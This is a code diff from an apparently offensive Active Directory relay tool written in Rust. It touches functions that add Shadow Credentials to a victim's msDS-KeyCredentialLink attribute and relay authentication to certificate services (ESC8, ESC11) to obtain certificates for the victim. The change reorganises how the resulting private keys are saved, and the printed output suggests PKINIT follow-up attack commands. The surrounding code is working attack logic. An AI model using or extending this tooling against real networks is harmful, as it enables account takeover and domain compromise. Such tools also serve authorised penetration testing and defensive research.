@@ -204,9 +204,14 @@ async fn relay_one(
         }
         RelayAction::LdapKeycred => {
             let kc = adhammer_kerberos::shadowcred::build_key_credential(&dn)?;
+            let key_path = format!("{target_object}.key.pem");
+            adhammer_core::write_secret_artifact(
+                std::path::Path::new(&key_path),
+                adhammer_core::SecretArtifact::PrivateKey,
+                kc.private_key_pem.as_bytes(),
+            )?;
             ld.modify_add(&dn, "msDS-KeyCredentialLink", kc.dn_binary.as_bytes())
                 .await?;
-            std::fs::write(format!("{target_object}.key.pem"), &kc.private_key_pem)?;
             println!("[+] Shadow Credential written on {dn} — key {target_object}.key.pem");
             println!("    → attack abuse --action pkinit --target {target_object} --realm <realm> --kdc {target_dc}");
         }
@@ -259,6 +264,12 @@ async fn relay_esc8(
     // Generate a fresh CSR; the subject is unused (the CA identifies the requester via the
     // authenticated Kerberos/NTLM channel — that's the victim we're relaying).
     let csr = adhammer_kerberos::csr::build_csr("adhammer-esc8", None)?;
+    let key_path = format!("{target_object}.esc8.key.pem");
+    adhammer_core::write_secret_artifact(
+        std::path::Path::new(&key_path),
+        adhammer_core::SecretArtifact::PrivateKey,
+        csr.key_pem.as_bytes(),
+    )?;
     let csr_pem = pem_wrap("CERTIFICATE REQUEST", &csr.der);
     let form = cert_request_form(&csr_pem, template);
 
@@ -330,9 +341,7 @@ async fn relay_esc8(
             .unwrap_or(r3.body.clone())
     };
     let cert_path = format!("{target_object}.esc8.pem");
-    let key_path = format!("{target_object}.esc8.key.pem");
     std::fs::write(&cert_path, &cert_bytes)?;
-    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
     println!("[+] certificate written to {cert_path} — key {key_path}");
     println!(
         "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
@@ -373,6 +382,12 @@ async fn relay_icpr(
     // Generate a fresh CSR and submit — the CA identifies the requester from the relayed
     // authentication, so no subject encoding is needed on our side.
     let csr = adhammer_kerberos::csr::build_csr("adhammer-esc11", None)?;
+    let key_path = format!("{target_object}.esc11.key.pem");
+    adhammer_core::write_secret_artifact(
+        std::path::Path::new(&key_path),
+        adhammer_core::SecretArtifact::PrivateKey,
+        csr.key_pem.as_bytes(),
+    )?;
     // The CA name is a required arg to CertServerRequest; on most CAs the ICPR endpoint
     // will infer it from context, but a client that sends the CN of the certification
     // authority is safe. The `target_object` name is not it — take the machine short-name.
@@ -396,9 +411,7 @@ async fn relay_icpr(
     }
     let cert_pem = pem_wrap("CERTIFICATE", &result.cert_der);
     let cert_path = format!("{target_object}.esc11.pem");
-    let key_path = format!("{target_object}.esc11.key.pem");
     std::fs::write(&cert_path, cert_pem.as_bytes())?;
-    std::fs::write(&key_path, csr.key_pem.as_bytes())?;
     println!("[+] ISSUED — certificate written to {cert_path} — key {key_path}");
     println!(
         "    → attack abuse --action pkinit --target <victim-sam> --value {key_path} --kdc <dc> --realm <realm>"
